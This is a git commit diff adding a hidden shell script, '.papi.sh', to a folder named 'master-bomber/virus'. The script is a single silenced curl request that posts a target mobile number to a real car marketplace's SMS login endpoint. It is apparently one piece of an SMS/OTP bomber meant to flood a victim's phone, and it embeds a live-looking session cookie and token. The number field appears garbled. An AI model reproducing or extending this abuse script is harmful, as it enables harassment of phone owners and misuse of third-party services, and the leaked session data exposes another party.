48a91d6438095ec16b550e8cf061e45504903b89
Jatin Kalwar <77274095+jatinkalwar@users.noreply.github.com>
2023-04-27 01:27:37 +0530

    Add files via upload

---
+++ master-bomber/virus/.papi.sh
@@ -0,0 +1,20 @@
+curl -o key.txt 'https://www.pakwheels.com/login-with-mobile' \
+  -H 'authority: www.pakwheels.com' \
+  -H 'accept: */*' \
+  -H 'accept-language: en-US,en;q=0.9' \
+  -H 'content-type: application/x-www-form-urlencoded; charset=UTF-8' \
+  -H 'cookie: _pakwheels_sessions=BAh7C0kiD3Nlc3Npb25faWQGOgZFVEkiJTIwZTk0NDhlZDFmMjJiZGZjYTkzMGQ1MDEwZmUwODE5BjsAVEkiFWxhc3RfYWN0aW9uX3RpbWUGOwBGVTogQWN0aXZlU3VwcG9ydDo6VGltZVdpdGhab25lWwhJdToJVGltZRwyMDIzLTA0LTI1IDE2OjExOjQ5IFVUQwY7AEZJIgxLYXJhY2hpBjsAVEl1OwccMjAyMy0wNC0yNSAyMToxMTo0OSBVVEMGOwBGSSITcGFrd2hlZWxzX21vZGUGOwBGSSIIQ2FyBjsAVEkiEF9jc3JmX3Rva2VuBjsARkkiMU1SZDNyVjMwSVJmRFpyUy92T3lzYUxTODZ0TXJpQWh5a1pqZTJTaURWSlE9BjsARkkiEnJldHVybl90b191cmwGOwBGIh9odHRwczovL3d3dy5wYWt3aGVlbHMuY29tL0kiDnNpdGVfdHlwZQY7AEZJIghjYXIGOwBU--159b9dd86ea4b829780600e36be68bc4713af8bc; userfp=7da2377a309b270deedd431db64725f5' \
+  -H 'origin: https://www.pakwheels.com' \
+  -H 'referer: https://www.pakwheels.com/' \
+  -H 'sec-ch-ua: "Chromium";v="112", "Google Chrome";v="112", "Not:A-Brand";v="99"' \
+  -H 'sec-ch-ua-mobile: ?0' \
+  -H 'sec-ch-ua-platform: "Windows"' \
+  -H 'sec-fetch-dest: empty' \
+  -H 'sec-fetch-mode: cors' \
+  -H 'sec-fetch-site: same-origin' \
+  -H 'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36' \
+  -H 'x-requested-with: XMLHttpRequest' \
+  --data-raw 'mobile_number=0€tor&web_login=1' \
+  --compressed > /dev/null 2>&1
+
+
